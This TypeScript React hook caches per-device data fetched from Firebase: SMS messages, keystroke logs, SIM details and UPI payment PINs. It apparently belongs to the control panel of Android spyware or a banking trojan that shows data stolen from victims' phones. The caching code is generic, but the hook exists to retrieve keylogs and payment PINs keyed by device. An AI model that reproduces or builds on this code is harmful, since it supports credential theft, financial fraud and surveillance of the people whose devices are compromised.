import { useRef, useCallback } from 'react';
import { firebaseService } from '@/lib/firebaseService';

// Simple in-memory cache with TTL
interface CacheEntry<T = any> {
  value: T;
  expiresAt: number; // epoch ms
}

type CacheStore = Map<string, CacheEntry>;

const DEFAULT_TTL_MS = 60_000; // 1 minute default

function now() {
  return Date.now();
}

export function useDataCache() {
  const cacheRef = useRef<CacheStore>(new Map());

  const getCached = useCallback(<T,>(key: string): T | undefined => {
    const entry = cacheRef.current.get(key);
    if (!entry) return undefined;
    if (entry.expiresAt < now()) {
      cacheRef.current.delete(key);
      return undefined;
    }
    return entry.value as T;
  }, []);

  const setCached = useCallback(<T,>(key: string, value: T, ttlMs: number = DEFAULT_TTL_MS) => {
    cacheRef.current.set(key, { value, expiresAt: now() + ttlMs });
  }, []);

  const invalidateCache = useCallback((prefix?: string) => {
    if (!prefix) {
      cacheRef.current.clear();
      return;
    }
    for (const key of Array.from(cacheRef.current.keys())) {
      if (key.startsWith(prefix)) cacheRef.current.delete(key);
    }
  }, []);

  // Message data
  const getDeviceMessages = useCallback(async (deviceId: string, ttlMs: number = DEFAULT_TTL_MS) => {
    const key = `messages:${deviceId}`;
    const hit = getCached<any[]>(key);
    if (hit) return hit;
    const fresh = await firebaseService.getDeviceSMSData(deviceId);
    setCached(key, fresh, ttlMs);
    return fresh;
  }, [getCached, setCached]);

  // Key logs
  const getDeviceKeyLogs = useCallback(async (deviceId: string, limit = 100, ttlMs: number = DEFAULT_TTL_MS) => {
    const key = `keylogs:${deviceId}:${limit}`;
    const hit = getCached<any[]>(key);
    if (hit) return hit;
    const fresh = await firebaseService.getKeyLogs(deviceId, limit);
    setCached(key, fresh, ttlMs);
    return fresh;
  }, [getCached, setCached]);

  // SIMs
  const getDeviceSims = useCallback(async (deviceId: string, ttlMs: number = DEFAULT_TTL_MS) => {
    const key = `sims:${deviceId}`;
    const hit = getCached<any[]>(key);
    if (hit) return hit;
    const fresh = await firebaseService.getSims(deviceId);
    setCached(key, fresh, ttlMs);
    return fresh;
  }, [getCached, setCached]);

  // UPI pins
  const getDeviceUPIPins = useCallback(async (deviceId: string, ttlMs: number = DEFAULT_TTL_MS) => {
    const key = `upipins:${deviceId}`;
    const hit = getCached<any[]>(key);
    if (hit) return hit;
    const fresh = await firebaseService.getUPIPins(deviceId);
    setCached(key, fresh, ttlMs);
    return fresh;
  }, [getCached, setCached]);

  return {
    getDeviceMessages,
    getDeviceKeyLogs,
    getDeviceSims,
    getDeviceUPIPins,
    invalidateCache,
  };
}
